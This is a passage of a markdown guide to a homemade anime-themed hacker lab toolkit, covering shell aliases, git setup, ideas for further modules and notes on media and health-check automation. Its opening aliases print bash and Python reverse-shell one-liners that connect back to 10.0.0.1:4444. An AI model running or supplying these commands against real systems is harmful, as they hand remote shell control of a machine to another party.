alias revshell-bash='echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'
alias revshell-python='echo "python -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\''"'

# Anime hacker combo
alias omae='echo "お前はもう死んでいる" && sleep 2 && echo "NANI?!" && sudo'
alias kamehameha='sudo apt update && sudo apt upgrade -y'
alias sharingan='watch -n1 -d'
alias bankai='sudo systemctl restart'
alias rasengan='kill -9'
alias genjutsu='sleep'
```

---

## How to Set This Up

1. **Create a GitHub repo** called `otaku-hacker-lab`
2. **Add all the module scripts** in `/modules/`
3. **Make it public** (or private with auth)
4. **Your brother runs**:
   ```bash
   git clone https://github.com/yourusername/otaku-hacker-lab.git ~/OtakuLab
   cd ~/OtakuLab && ./lab.sh
   ```

## The Advantages

- **Version controlled** - Easy updates with `git pull`
- **Modular** - Each module is a separate file
- **Community** - Others can contribute modules
- **Reliable** - No hoping Claude generates things correctly
- **Persistent** - Tracks what's installed
- **Shareable** - Your brother can share his setup

## Extra Modules You Could Add

- **demon_mode.sh** - Aggressive red team tools
- **dark_side.sh** - Tor, I2P, hidden services  
- **crypto_shrine.sh** - Cryptocurrency tools
- **data_tomb.sh** - Data hoarding, archiving
- **quantum_breach.sh** - Post-quantum crypto research
- **ghost_protocol.sh** - Anti-forensics, steganography

Each module can be as complex as needed, with proper error handling, dependencies, etc. The git approach makes it all manageable!

## 🗂️ Media Management: FileBot Automation

- Use the new FileBot integration for all media renaming and organization tasks.
- Legacy/manual steps are deprecated; always prefer the automated function.
- Example usage:

```bash
source modules/data_hoarding.sh
automate_media_renaming
```

- FileBot must be installed: https://www.filebot.net/
- Actions are logged to ~/.billsloth-reminders/filebot_automation.log

## 🧠 Mature-First Philosophy

- Always check for a robust, open-source solution before building custom logic.
- Use custom scripts only as glue or fallback, and document all decisions in METHODS_LOG.md.

## 🩺 On-Demand System Health Check

- Use the `system-health` alias (runs `glances`) for a friendly, all-in-one summary of disk, memory, CPU, and network status.
- If Glances is not installed, run: `sudo apt install glances`
- No background monitoring, no nagging—just info when you want it.
- Only truly critical issues are flagged in the Glances UI.
- Output is ADHD/dyslexia-friendly and non-alarming.

## 🕵️ Workflow Auditing (AI-Powered)

You can audit any workflow in seconds and see AI-powered upgrade suggestions:

```bash
# Example: Audit the streaming setup workflow
bin/audit_workflow streaming_setup_interactive
```

- The script runs an LLM audit, logs results, and shows a friendly TUI summary.
- All audits are stored in `~/.bill-sloth/audit.log` for future review.
- You can also run audits from the main menu (look for 'Audit' options).